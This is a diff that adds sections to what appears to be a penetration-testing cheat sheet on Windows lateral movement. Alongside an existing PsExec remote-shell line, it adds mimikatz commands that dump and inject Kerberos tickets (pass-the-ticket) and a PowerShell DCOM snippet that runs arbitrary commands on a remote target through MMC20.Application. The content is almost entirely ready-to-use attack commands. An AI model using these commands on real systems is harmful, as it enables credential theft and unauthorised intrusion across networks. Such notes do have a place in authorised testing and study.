@@ -74,3 +74,21 @@ In powershell / cmd
 ```
 .\PsExec.exe \\host cmd
 ```
+
+# Pass the Ticket
+
+in mimikatz
+
+```
+sekurlsa::tickets /export
+
+kerberos::ptt <ticket.kirbi>
+```
+
+# DCOM
+
+```
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target IP>"))
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"<powershell command>","7")
+```
